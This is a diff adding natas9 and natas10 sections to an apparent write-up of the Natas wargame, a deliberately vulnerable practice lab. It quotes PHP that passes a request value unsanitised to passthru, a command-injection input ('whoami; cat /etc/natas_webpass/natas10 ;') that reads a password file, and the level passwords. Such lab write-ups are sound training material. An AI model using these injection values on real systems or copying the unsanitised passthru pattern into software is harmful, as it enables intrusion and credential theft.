@@ -158,3 +158,55 @@ the final code is `oubWYf2kBq` which reveals the password.
 ```
 W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 ```
+
+### natas9
+
+Another secret.
+
+Lets take a look at the source code.
+
+```php+HTML
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+</pre>
+```
+
+I might be able to inject a command into `grep -i $key dictionary.txt` . With the entry `whoami; cat /etc/natas_webpass/natas10 ; ` so that it looks like `grep -i whoami; cat /etc/natas_webpass/natas10; dictionary.txt`
+
+Boom.
+
+![image-20200910200842416](natas10.png)
+
+```
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+```
+
+### natas10
+
+```
+For security reasons, we now filter on certain characters
+```
+
+Hoa boi.... ( Had to look this one up)
+
+You inject another file for the grep command to lookup. Lets do `/etc/natas_webpass/natas11` cause thats the goal I guess.
+
+![image-20200910202050243](natas11.png)
+
+```
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+```
+
+### natas11
+
